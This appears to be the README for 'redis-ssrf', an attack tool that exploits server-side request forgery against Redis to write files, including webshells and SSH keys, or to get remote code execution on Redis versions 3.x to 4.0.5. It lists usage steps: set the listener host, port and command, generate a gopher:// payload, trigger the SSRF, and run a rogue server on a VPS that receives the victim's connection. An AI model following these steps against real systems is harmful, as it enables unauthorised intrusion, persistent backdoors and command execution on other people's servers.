# redis-ssrf
1. ssrf to write files. eg: webshell and ssh key
2. ssrf to rce (3.x <= verion <= 4.0.5)

## Requirements
python2.x 3.x ssrf-redis.py

python2.x rogue-server.py (lazy

## Usage
implememt for demo.

plz read generate_payload function and change payload.

for rce usage:

1. change lhost, lport and command, then    
`> python ssrf-redis.py`    
`> gopher://xxxxx`     

2. triger ssrf

3. meanwhile on vps    
`> python rogue-server.py`   
`> Accepted connection from 192.168.x.x`

(Need to compile a module at first or download other's)
## Reference
Inspired by https://github.com/n0b0dyCN/redis-rogue-server

Also, modified from https://xz.aliyun.com/t/5665

